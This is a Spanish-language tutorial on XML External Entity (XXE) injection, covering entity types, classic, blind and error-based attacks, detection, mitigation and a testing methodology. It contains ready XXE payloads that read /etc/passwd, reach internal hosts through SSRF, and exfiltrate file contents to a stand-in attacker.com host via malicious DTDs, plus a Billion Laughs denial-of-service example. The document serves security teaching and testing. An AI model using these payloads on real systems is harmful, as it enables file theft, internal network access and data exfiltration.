---
icon: folder-open
---

# XML external entity (XXE) injection

### 🔍 ¿Qué es XXE?

**XML External Entity (XXE)** es una vulnerabilidad que ocurre cuando un parser XML procesa entidades externas sin validación adecuada.

Esto permite a un atacante:

* Leer archivos arbitrarios del sistema
* Realizar SSRF hacia sistemas internos
* Provocar denegación de servicio (Billion Laughs)
* En algunos casos, ejecución remota de código
* Exfiltrar datos mediante canales externos

El problema existe porque XML permite definir entidades externas (archivos, URLs) y muchos parsers lo tienen habilitado por defecto.

***

### 🧱 Entidades XML

#### 🔗 Entidades internas

```xml
<!DOCTYPE foo [
  <!ENTITY greeting "Hello World">
]>
<message>&greeting;</message>
```

**Resultado:**

```xml
<message>Hello World</message>
```

#### 🌐 Entidades externas

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

Resultado: contenido de `/etc/passwd`

#### ⚙️ Entidades de parámetro

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

Carga y ejecuta una DTD externa.

***

### ⚔️ Tipos de ataques XXE

#### 📡 XXE clásico (In-Band)

* La entidad se resuelve directamente
* El resultado aparece en la respuesta
* Permite lectura directa de archivos

#### 🌫️ Blind XXE (Out-of-Band)

* No hay respuesta directa
* Se usan canales externos (DNS, HTTP)
* Exfiltración indirecta

#### ❌ XXE basado en errores

* Se provocan errores XML
* El mensaje incluye datos del archivo

#### 🧩 Blind XXE con entidades de parámetro

* Las entidades normales están bloqueadas
* Las de tipo `%` siguen funcionando

***

### 🛤️ Vectores comunes

#### 📂 Lectura de archivos

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### 🌐 SSRF

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<data>&xxe;</data>
```

#### 📤 Exfiltración out-of-band

DTD maliciosa:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

#### 🚨 Exfiltración por error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

#### 🔗 XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

#### 📁 Subida de SVG

```xml
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg>
  <text>&xxe;</text>
</svg>
```

***

### 🕵️ Técnicas Blind XXE

#### 🌍 Detección vía DNS

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.oastify.com">]>
<data>&xxe;</data>
```

#### ⚙️ Entidades de parámetro

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com">
  %xxe;
]>
```

#### 📤 Exfiltración OOB

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

#### 🚨 Exfiltración por error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
%eval;
%error;
```

***

### 🚀 Explotación avanzada

#### 🏴‍☠️ Secuestro de DTD local

```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
```

Permite reutilizar DTDs locales para evadir restricciones.

#### 💥 Ataque Billion Laughs (DoS)

```xml
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;...">
```

Genera expansión exponencial y consume memoria.

#### 📬 XXE en SOAP

```xml
<soap:Body>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <userId>&xxe;</userId>
</soap:Body>
```

#### 📄 XXE en documentos Office

Archivos `.docx` / `.xlsx` contienen XML interno vulnerable.

***

### 🎯 Endpoints vulnerables comunes

* Subidas de XML
* Import/export de configuraciones
* APIs SOAP o REST con XML
* Procesadores de SVG
* Generadores de PDF
* SAML, XML-RPC, WS-Security

***

### 💥 Impacto real

* Acceso a archivos internos
* SSRF a servicios internos
* Robo de credenciales (ej. AWS metadata)
* Fuga de datos
* DoS

***

### 🔎 Métodos de detección

#### ✍️ Manual

```xml
<!DOCTYPE foo [<!ENTITY test "INJECTED">]>
<data>&test;</data>
```

Si aparece "INJECTED" → vulnerable.

#### 📂 Lectura de archivo

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

#### 🌐 Out-of-band

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]>
<data>&xxe;</data>
```

#### 🤖 Automatizado

* Burp Suite
* OWASP ZAP
* Scripts personalizados
* Cambiar Content-Type

***

### 🛡️ Mitigación

#### 🚫 Deshabilitar entidades externas

Ejemplo en Java:

```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

#### ✅ Validación de entrada

```python
if b'<!DOCTYPE' in xml_data:
    raise ValueError("DTD no permitido")
```

#### 🧰 Usar parsers seguros

* defusedxml (Python)
* Configuración segura en Java

#### 🔄 Alternativas

* Usar JSON en lugar de XML

#### 🔒 Principio de mínimo privilegio

* Limitar acceso al sistema de archivos
* Aislar el parser

***

### 📋 Metodología de testeo

1. Identificar entradas XML
2. Probar entidades básicas
3. Intentar lectura de archivos
4. Probar OOB
5. Testear XInclude
6. Probar entidades de parámetro
